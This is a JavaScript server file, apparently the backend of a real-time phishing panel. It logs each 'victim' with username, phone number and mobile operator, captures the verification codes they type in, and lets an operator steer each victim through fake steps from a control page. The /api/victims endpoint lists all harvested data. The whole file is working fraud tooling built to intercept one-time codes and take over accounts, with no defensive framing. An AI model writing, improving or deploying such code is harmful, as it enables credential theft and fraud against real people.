const express = require('express');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
app.use(express.json());

const sessions = new Map();

// Socket.IO setup (adapté Vercel)
let io;
function getIo(req, res) {
    if (!io) {
        const httpServer = require('http').createServer(app);
        io = new Server(httpServer, {
            path: '/socket.io',
            cors: { origin: "*" }
        });

        io.on('connection', (socket) => {
            console.log('Client Socket connecté');

            socket.on('joinSession', (sessionId) => {
                socket.join(`session-${sessionId}`);
            });

            socket.on('chatMessage', (data) => {
                io.to(`session-${data.sessionId}`).emit('command', { 
                    action: 'chatMessage', 
                    message: data.message,
                    from: data.from 
                });
            });
        });
    }
    return io;
}

// ====================== ROUTES ======================
app.post('/api/submit', (req, res) => {
    const { username, phone, operator, sessionId } = req.body;
    if (!sessionId || !username || !phone) return res.status(400).json({ error: "Données manquantes" });

    sessions.set(sessionId, {
        username: username.trim(),
        phone: phone.trim(),
        operator: (operator || "Inconnu").trim(),
        status: "waiting",
        code: null,
        forceStep2: false,
        timestamp: Date.now()
    });
    console.log(`[+] Nouvelle victime → ${sessionId} | ${username}`);
    res.json({ success: true });
});

app.post('/api/force-step2', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        const v = sessions.get(sessionId);
        v.status = "step2_forced";
        v.forceStep2 = true;
        getIo().to(`session-${sessionId}`).emit('command', { action: 'forceStep2' });
    }
    res.json({ success: true });
});

app.post('/api/force-step3', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        const v = sessions.get(sessionId);
        v.status = "step3";
        getIo().to(`session-${sessionId}`).emit('command', { action: 'forceStep3' });
    }
    res.json({ success: true });
});

app.post('/api/code', (req, res) => {
    const { sessionId, code } = req.body;
    if (sessions.has(sessionId)) {
        const v = sessions.get(sessionId);
        v.code = code;
        v.status = "code_received";
        getIo().to(`session-${sessionId}`).emit('command', { action: 'codeEntered', code });
    }
    res.json({ success: true });
});

app.post('/api/bad-code', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        getIo().to(`session-${sessionId}`).emit('command', { action: 'badCode' });
    }
    res.json({ success: true });
});

app.post('/api/delete-session', (req, res) => {
    const { sessionId } = req.body;
    if (sessions.has(sessionId)) {
        sessions.delete(sessionId);
        console.log(`[-] Session supprimée : ${sessionId}`);
    }
    res.json({ success: true });
});

app.get('/api/victims', (req, res) => {
    const arr = Array.from(sessions.entries())
        .map(([id, data]) => ({ sessionId: id, ...data }))
        .sort((a, b) => b.timestamp - a.timestamp);
    res.json(arr);
});

// Servir les fichiers statiques (index.html + control.html)
app.use(express.static(path.join(__dirname, '../public')));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, '../public/index.html')));
app.get('/control', (req, res) => res.sendFile(path.join(__dirname, '../public/control.html')));

// Export pour Vercel
module.exports = app;
